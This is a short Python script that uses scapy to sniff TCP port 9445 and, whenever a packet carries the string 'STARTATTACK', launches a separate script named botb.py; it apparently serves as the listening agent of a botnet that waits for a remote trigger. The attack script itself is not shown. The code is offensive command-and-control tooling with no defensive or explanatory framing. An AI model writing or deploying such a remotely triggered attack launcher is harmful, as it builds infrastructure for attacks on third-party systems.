from scapy.all import sniff, IP, TCP, Raw
import subprocess

listen_port = 9445


def handle_packet(packet):
    if packet.haslayer(Raw) and packet.haslayer(TCP) and packet[TCP].dport == listen_port:
        payload = packet[Raw].load.decode(errors='ignore')

        if "STARTATTACK" in payload:
            print("Received STARTATTACK command! Executing botb.py...")
            subprocess.run(["python3", "botb.py"])
        else:
            print("Received unknown command:", payload)


if __name__ == "__main__":
    print(f"Listening for commands on port {listen_port}...")
    sniff(filter=f"tcp port {listen_port}", prn=handle_packet, store=0)